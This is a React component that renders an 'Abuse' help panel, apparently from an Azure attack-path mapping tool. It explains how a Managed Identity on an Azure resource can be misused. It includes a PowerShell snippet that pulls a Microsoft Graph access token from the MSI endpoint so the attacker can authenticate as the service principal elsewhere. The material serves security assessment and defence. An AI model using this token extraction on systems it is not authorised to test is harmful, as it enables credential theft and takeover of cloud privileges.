import React from 'react';

const Abuse = () => {
    return (
        <>
            <p>
                You can modify the Azure RM resource to execute actions against Azure with the 
                privileges of the Managed Identity Service Principal.
            </p>
            <p>
                It is also possible to extract a JSON Web Token (JWT) for the Service Principal, 
                then use that JWT to authenticate as the Service Principal outside the scope of
                the Azure RM resource. Here is how you extract the JWT using PowerShell:
            </p>
            <pre>
                <code>
                    {
                        '$tokenAuthURI = $env:MSI_ENDPOINT + "?resource=https://graph.microsoft.com/&api-version=2017-09-01"\n' +
                        '$tokenResponse = Invoke-RestMethod -Method Get -Headers @{"Secret"="$env:MSI_SECRET"} -Uri $tokenAuthURI\n' +
                        '$tokenResponse.access_token'
                    }
                </code>
            </pre>    
            <p>
                We can then use this JWT to authenticate as the Service Principal to the Microsoft 
                Graph APIs using BARK for example.
            </p>
        </>
    );
};

export default Abuse;
